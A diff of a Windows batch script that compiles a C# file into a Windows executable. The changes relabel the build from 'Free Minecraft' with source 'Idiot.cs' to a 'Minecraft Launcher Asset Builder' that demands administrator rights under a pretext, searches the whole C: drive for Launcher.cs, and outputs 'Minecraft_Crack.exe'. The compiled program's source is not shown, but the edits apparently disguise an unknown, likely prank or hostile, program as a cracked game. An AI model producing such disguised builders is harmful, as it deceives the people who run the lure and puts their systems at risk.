@@ -1,54 +1,45 @@
 @echo off
-title Free Minecraft Compiler - DBI Edition
+title Minecraft Launcher Asset Builder
 color 0b
 
-:: 1. CHECK FOR ADMIN RIGHTS
+:: 1. ADMIN CHECK
 net session >nul 2>&1
 if %errorLevel% neq 0 (
-    echo [!!] ERROR: PLEASE RUN AS ADMINISTRATOR [!!]
-    echo Right-click this file and select "Run as administrator".
+    echo [!!] PLEASE RUN AS ADMIN TO INITIALIZE ASSETS [!!]
     pause
     exit
 )
 
-:: 2. DETECT COMPILER
-echo Searching for C# Compiler...
+:: 2. DEEP SEARCH FOR Launcher.cs
+echo Searching for Launcher source files...
+set "SOURCE_FILE="
+for /r C:\ %%f in (Launcher.cs) do (
+    if exist "%%f" (
+        set "SOURCE_FILE=%%f"
+        goto found
+    )
+)
+
+:found
+if not defined SOURCE_FILE (
+    echo [!!] ERROR: Launcher.cs NOT FOUND!
+    pause
+    exit
+)
+echo [OK] Found source at: %SOURCE_FILE%
+
+:: 3. FIND COMPILER
 set "CSC="
-if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" (
-    set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
-) else if exist "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe" (
-    set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
-)
+if exist "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" set "CSC=C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
+if not defined CSC set "CSC=C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
 
-if not defined CSC (
-    echo [!!] ERROR: C# Compiler not found! 
-    echo Please make sure .NET Framework 4.0/4.5 is installed.
-    pause
-    exit
-)
+:: 4. COMPILE
+echo Initializing Game Build...
+"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Minecraft_Crack.exe" "%SOURCE_FILE%"
 
-:: 3. CHECK FOR SOURCE FILE
-if not exist "Idiot.cs" (
-    echo [!!] ERROR: "Idiot.cs" NOT FOUND!
-    echo Make sure your C# code is saved as "Idiot.cs" in this folder.
-    pause
-    exit
-)
-
-:: 4. COMPILATION
-echo [OK] Compiler found. Building "Free Minecraft.exe"...
-echo.
-
-"%CSC%" /target:winexe /r:System.Windows.Forms.dll /r:System.Drawing.dll /out:"Free Minecraft.exe" Idiot.cs
-
-if exist "Free Minecraft.exe" (
-    echo.
-    echo ==============================================
-    echo   SUCCESS! "Free Minecraft.exe" is ready.
-    echo ==============================================
+if exist "Minecraft_Crack.exe" (
+    echo [SUCCESS] "Minecraft_Crack.exe" is ready to play!
 ) else (
-    echo.
-    echo [!!] COMPILATION FAILED. Check for errors in your C# code.
+    echo [BUILD FAILED]
 )
-
 pause
